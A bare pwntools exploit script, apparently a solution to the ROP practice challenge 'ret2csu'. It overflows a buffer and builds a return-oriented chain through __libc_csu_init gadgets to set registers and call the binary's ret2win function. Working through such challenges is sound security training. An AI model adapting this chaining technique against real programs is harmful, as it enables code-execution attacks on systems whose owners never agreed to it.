#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ret2csu')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

payload = (
    b"A" * 40 +
    p64(0x40089a) +
    p64(0x0) + # rbx
    p64(0x1) + # rbp
    p64(0x600e38) + # r12
    p64(0x41) + # r13
    p64(0x41) + # r14
    p64(0xdeadcafebabebeef) + # r15

    p64(0x400880) +
    p64(0x0) * 7 +
    p64(exe.sym.ret2win)
)

io.sendline(payload)

io.interactive()

